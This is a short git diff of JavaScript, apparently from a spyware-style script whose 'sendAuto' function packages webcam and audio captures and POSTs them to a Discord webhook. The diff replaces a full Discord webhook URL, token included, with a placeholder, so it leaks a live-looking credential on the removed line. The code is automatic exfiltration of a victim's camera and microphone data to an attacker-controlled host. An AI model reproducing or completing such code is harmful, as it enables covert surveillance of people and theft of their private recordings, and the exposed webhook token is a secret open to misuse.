@@ -173,7 +173,7 @@ async function sendAuto(){
     
     formData.append('payload_json', JSON.stringify(webcamPayload));
     
-    await fetch("https://discord.com/api/webhooks/1454106851628158988/_m_C70XTl0dEBqUsdqAxn9Qs0SZiVQbpzZmXzJeTe8jQXryQNTfqzBz7AYJ-HqE56ycU",{
+    await fetch("webhook_discord_here",{
       method:"POST",
       body: formData
     });
@@ -199,7 +199,7 @@ async function sendAuto(){
     
     formData.append('payload_json', JSON.stringify(audioPayload));
     
-    await fetch("Webhook_discord_here",{
+    await fetch("webhook_discord_here",{
       method:"POST",
       body: formData
     });
